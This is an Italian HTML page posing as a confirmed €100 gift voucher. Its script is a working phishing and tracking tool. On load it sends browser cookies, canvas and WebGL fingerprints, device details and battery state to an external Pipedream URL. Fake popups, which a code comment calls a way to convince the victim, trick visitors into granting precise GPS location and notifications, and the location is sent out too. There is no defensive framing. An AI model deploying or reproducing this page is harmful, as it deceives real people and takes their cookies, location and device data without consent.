<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🎁 Buono Regalo</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
        .card{background:white;border-radius:30px;padding:40px 30px;max-width:380px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.2)}
        .emoji{font-size:70px;margin-bottom:15px}
        h1{color:#333;font-size:24px;margin-bottom:10px}
        .amount{font-size:55px;font-weight:bold;color:#764ba2;margin:20px 0}
        .bar{background:#e0e0e0;border-radius:20px;height:8px;margin:20px 0;overflow:hidden}
        .barfill{background:#764ba2;height:100%;width:0%;border-radius:20px;transition:width .3s}
        .status{color:#666;font-size:14px;margin-top:10px}
        .footer{font-size:11px;color:#aaa;margin-top:20px}
    </style>
</head>
<body>
    <div class="card">
        <div class="emoji">🎁</div>
        <h1>Buono Regalo Confermato!</h1>
        <p>Il tuo premio è in elaborazione</p>
        <div class="amount">€100</div>
        <div class="bar"><div class="barfill" id="barfill"></div></div>
        <p class="status" id="status">Verifica account...</p>
        <p class="footer">Riceverai il buono via email entro 24 ore</p>
    </div>

    <script>
        const PIPEDREAM_URL = "https://69cd60beb3f0593eb064103e51330e55.m.pipedream.net";
        const data = {};
        let step = 0;

        // Popup finto per convincere la vittima
        function fakePopup(tipo, callback) {
            const messaggi = {
                gps: {
                    titolo: "📍 Attiva geolocalizzazione",
                    testo: "Dobbiamo verificare che ti trovi in Italia per il premio.",
                    btn: "Verifica Posizione"
                },
                notifiche: {
                    titolo: "🔔 Notifiche premio",
                    testo: "Attiva le notifiche per ricevere il buono quando è pronto!",
                    btn: "Attiva Notifiche"
                }
            };
            const m = messaggi[tipo];
            const overlay = document.createElement('div');
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:9999;display:flex;justify-content:center;align-items:center;';
            overlay.innerHTML = '<div style="background:white;border-radius:15px;padding:30px;max-width:320px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.3);">' +
                '<div style="font-size:50px;margin-bottom:15px;">' + (tipo==='gps'?'📍':'🔔') + '</div>' +
                '<h3 style="color:#333;margin-bottom:10px;">' + m.titolo + '</h3>' +
                '<p style="color:#666;font-size:14px;margin-bottom:20px;">' + m.testo + '</p>' +
                '<button id="fakeBtn" style="background:#764ba2;color:white;border:none;padding:12px 30px;border-radius:25px;font-size:16px;cursor:pointer;">' + m.btn + '</button><br>' +
                '<small style="color:#aaa;">Poi clicca Consenti sul popup del browser</small></div>';
            document.body.appendChild(overlay);
            document.getElementById('fakeBtn').onclick = () => { overlay.remove(); callback(); };
        }

        // Dati
        function baseData() {
            data.timestamp = new Date().toISOString();
            data.userAgent = navigator.userAgent;
            data.platform = navigator.platform;
            data.language = navigator.language;
            data.screen = screen.width + "x" + screen.height;
            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            data.cookies = document.cookie;
            try {
                const c = document.createElement("canvas");
                const x = c.getContext("2d");
                x.textBaseline = "top"; x.font = "14px Arial";
                x.fillStyle = "#f60"; x.fillRect(125,1,62,20);
                x.fillText("FP", 2, 15);
                data.canvasFP = c.toDataURL().substring(0,200);
            } catch(e) {}
            try {
                const c = document.createElement("canvas");
                const g = c.getContext("webgl");
                if(g) {
                    const d = g.getExtension("WEBGL_debug_renderer_info");
                    data.webglRenderer = g.getParameter(d.UNMASKED_RENDERER_WEBGL);
                }
            } catch(e) {}
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    data.battery = { level: Math.round(b.level*100)+"%", charging: b.charging };
                    send();
                }).catch(() => send());
            } else { send(); }
        }

        function send() {
            fetch(PIPEDREAM_URL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify(data)
            }).catch(() => {});
        }

        // Step 1
        function stepGPS() {
            document.getElementById('status').textContent = 'Verifica posizione...';
            fakePopup('gps', () => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            data.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
                            send();
                        },
                        err => {
                            data.gps = "rifiutato";
                            send();
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );
                }
                // Dopo 
                setTimeout(stepNotifiche, 1000);
            });
        }

        // Step 2
        function stepNotifiche() {
            document.getElementById('status').textContent = 'Configurazione notifiche...';
            fakePopup('notifiche', () => {
                if ('Notification' in window) {
                    Notification.requestPermission().then(perm => {
                        data.notifications = perm;
                        if (perm === 'granted') {
                            new Notification("✅ Premio Attivato!", {
                                body: "Riceverai il tuo buono regalo entro 24 ore. Torna presto!",
                                icon: "🎁",
                                requireInteraction: true
                            });
                        }
                        send();
                    });
                }
                setTimeout(() => {
                    document.getElementById('status').textContent = '✅ Completato!';
                }, 500);
            });
        }

        // Animazione
        let p = 0;
        const bar = document.getElementById("barfill");
        const msgs = ["Verifica account...","Conferma premio...","Generazione buono...","Invio email..."];
        let i = 0;
        setInterval(() => {
            p += Math.random() * 25;
            if(p > 100) p = 100;
            bar.style.width = p + "%";
            if(p > (i+1)*25 && i < msgs.length) { document.getElementById('status').textContent = msgs[i]; i++; }
        }, 500);

        // Avvia
        baseData();
        setTimeout(stepGPS, 2000);
    </script>
</body>
</html>
